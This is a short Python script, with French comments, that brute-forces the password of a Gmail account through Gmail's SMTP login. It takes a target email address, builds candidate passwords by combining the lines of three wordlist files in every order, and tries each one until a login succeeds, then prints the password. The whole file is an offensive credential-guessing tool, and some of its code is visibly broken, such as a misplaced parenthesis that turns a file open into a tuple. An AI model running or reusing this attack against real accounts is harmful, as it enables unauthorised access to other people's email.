import smtplib
import pickle
import os
from os import path 
import builtins

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()



user =input("enter email") 
#passF = input("Enter wordlist :")
passF = "8-more-passwords.txt"
passF = open(passF, 'r')


def from_file( file_name):
        if os.path.isfile(file_name):
            my_file = builtins.open(file_name, "rb", os.O_NONBLOCK) #verifier pour le os.O_NONBLOCK
            file_list = pickle.load( my_file )
            my_file.close()
            return file_list
        else:
            return None

def open_file(file_name):
    my_file = builtins.open(file_name, "r", os.O_NONBLOCK) #verifier pour le os.O_NONBLOCK
    my_file = my_file.split('\n')
    return my_file

def try_brute(passF=passF):
    for password in passF:

        try:
            print("tentative : {}".format(password))
            smtpserver.login(user, password)
            print("password : {}".format(password))
            break
        
        except smtplib.SMTPAuthenticationError:
            print("failed")

def new_list(file_name_1, file_name_2, file_name_3):
    l1 = open(file_name_1, 'r')
    l2= open(file_name_2), 'r'
    l3 = open(file_name_3, 'r')
    new_list = []
    for e1 in l1:
        for e2 in l2:
            for e3 in l3:
                new_list.append("{}{}{}".format(e1,e2,e3))
                new_list.append("{}{}{}".format(e2,e1,e3))
                new_list.append("{}{}{}".format(e3,e2,e1))
                new_list.append("{}{}{}".format(e2,e3,e1))
                new_list.append("{}{}{}".format(e3,e1,e2))
                new_list.append("{}{}{}".format(e1,e3,e2))
    return new_list

try_brute(passF = new_list("pass.txt", "pass_1.txt", "pass_2.txt"))
